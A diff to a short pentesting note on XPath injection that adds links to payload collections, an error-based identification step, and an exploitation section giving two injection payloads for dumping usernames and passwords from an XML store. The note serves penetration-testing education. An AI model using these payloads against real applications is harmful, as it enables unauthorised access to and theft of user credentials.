@@ -1,17 +1,37 @@
 ## XPath Injection
 
+## Payloads:
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XPATH%20Injection/README.md
+https://book.hacktricks.wiki/en/pentesting-web/xpath-injection.html
+
 ## Identification
 
-### 1) Add a single quote in a parameter
-
-    '
+### 1) Add gibberish in the parameter
+    
+    test, blah, etc
 
 Then you may get an error like this:
 
-    XML Error; No '//text() entity found
+    XML Error; No test entity found
     Warning: SimpleXMLElement::xpath(): Invalid expression in /var/www/html/portal.php on line 68
 
 This verifies that it is vulnerable to XPath Injection
+
+## Exploitation
+
+Try to dump sensitive information like passwords and usernames.
+
+Example payload:
+
+Users
+
+    ')] | //user/*[contains(*,'
+
+Passwords
+
+    %27)%5D/password%20%7C%20a%5Bcontains(a,%27
+
 
 #### XPath Syntax
 
